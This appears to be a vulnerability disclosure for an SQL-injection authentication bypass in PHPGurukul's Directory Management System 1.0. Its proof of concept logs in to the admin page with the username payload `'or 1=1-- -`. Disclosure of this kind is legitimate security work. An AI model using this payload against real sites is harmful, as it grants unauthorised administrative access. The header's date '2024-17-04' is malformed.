# Directory Management System - Authentication Bypass
+ **Exploit Title:** Directory Management System - Authentication Bypass
+ **Date:** 2024-17-04
+ **Exploit Author:** Burak Sevben
+ **Vendor Homepage:** https://phpgurukul.com/directory-management-system-using-php-and-mysql/
+ **Software Link:** https://phpgurukul.com/?sdm_process_download=1&download_id=9346
+ **Version:** 1.0
+ **Tested on:** Kali Linux + PHP 8.2.12, Apache 2.4.58
+ **CVE:** Reported, waiting for CVE number.

## Description:
Directory Management System allows Authentication Bypass via the `username` and `password` parameters at "http://localhost/dms/admin/index.php". 

## Proof of Concept:
+ Go to this address: "http://localhost/dms/admin/index.php".
+ username : `'or 1=1-- -` password : `1`  and log in
+ Authentication Bypass Successful !

![Ekran görüntüsü 2024-05-19 174334](https://github.com/BurakSevben/CVEs/assets/117217689/baff2614-c955-4523-92d7-4979bd5ee8a9)

![Ekran görüntüsü 2024-05-19 174401](https://github.com/BurakSevben/CVEs/assets/117217689/3b493e54-6d2b-4404-90ea-2076d7c25d89)

